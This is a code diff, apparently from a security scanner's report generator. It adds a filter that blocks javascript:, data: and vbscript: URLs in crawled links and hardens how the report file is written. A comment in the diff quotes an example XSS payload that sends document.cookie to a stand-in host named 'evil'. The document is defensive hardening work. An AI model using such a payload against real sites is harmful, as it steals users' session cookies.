@@ -272,19 +272,19 @@ tr.row-hidden{display:none}
   {% set login_urls = urls|selectattr('is_login')|list %}
   {% if login_urls %}
   <h3 style="font-size:13px;margin-top:12px;color:var(--high)">Login / Auth Pages</h3>
-  <ul class="ls">{% for u in login_urls[:30] %}<li><a href="{{ u.url }}" target="_blank">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
+  <ul class="ls">{% for u in login_urls[:30] %}<li><a href="{{ u.url|safe_url }}" target="_blank" rel="noopener noreferrer">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
   {% endif %}
 
   {% set sens = urls|selectattr('is_sensitive_file')|list %}
   {% if sens %}
   <h3 style="font-size:13px;margin-top:12px;color:var(--crit)">Sensitive Files</h3>
-  <ul class="ls">{% for u in sens[:30] %}<li><a href="{{ u.url }}" target="_blank">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
+  <ul class="ls">{% for u in sens[:30] %}<li><a href="{{ u.url|safe_url }}" target="_blank" rel="noopener noreferrer">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
   {% endif %}
 
   {% set api = urls|selectattr('is_api')|list %}
   {% if api %}
   <h3 style="font-size:13px;margin-top:12px;color:var(--ac)">API Endpoints</h3>
-  <ul class="ls">{% for u in api[:30] %}<li><a href="{{ u.url }}" target="_blank">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
+  <ul class="ls">{% for u in api[:30] %}<li><a href="{{ u.url|safe_url }}" target="_blank" rel="noopener noreferrer">{{ u.url }}</a> {% if u.status %}<span class="tag">{{ u.status }}</span>{% endif %}</li>{% endfor %}</ul>
   {% endif %}
   {% else %}<p class="empty">No URLs collected.</p>{% endif %}
   </div>
@@ -469,6 +469,19 @@ def generate(result, formats: list = None) -> str:
     owasp_counts_raw = result.count_by_owasp() if hasattr(result, "count_by_owasp") else {}
     owasp_counts = dict(sorted(owasp_counts_raw.items(), key=lambda x: -x[1]))
     env = Environment(loader=BaseLoader(), autoescape=True)
+
+    # Reject javascript:/data:/vbscript: schemes in URL cells so a crawled
+    # XSS payload (`javascript:fetch('//evil?c='+document.cookie)`) cannot
+    # render as a clickable link in the report. Jinja's autoescape handles
+    # text content but not URL-scheme policy.
+    def _safe_url(u):
+        if not u or not isinstance(u, str):
+            return "#"
+        s = u.strip().lower()
+        if s.startswith(("http://", "https://", "/", "#", "?", "mailto:")):
+            return u
+        return "#"
+    env.filters["safe_url"] = _safe_url
     tmpl = env.from_string(REPORT_HTML)
 
     html = tmpl.render(
@@ -500,7 +513,8 @@ def generate(result, formats: list = None) -> str:
 
     if "html" in formats:
         html_path = f"{result.base_dir}/06_reports/report.html"
-        Path(html_path).write_text(html)
+        Path(html_path).parent.mkdir(parents=True, exist_ok=True)
+        Path(html_path).write_text(html, encoding="utf-8")
         logger.info(f"  HTML report: {html_path}")
         first_path = first_path or html_path
     if "json" in formats:
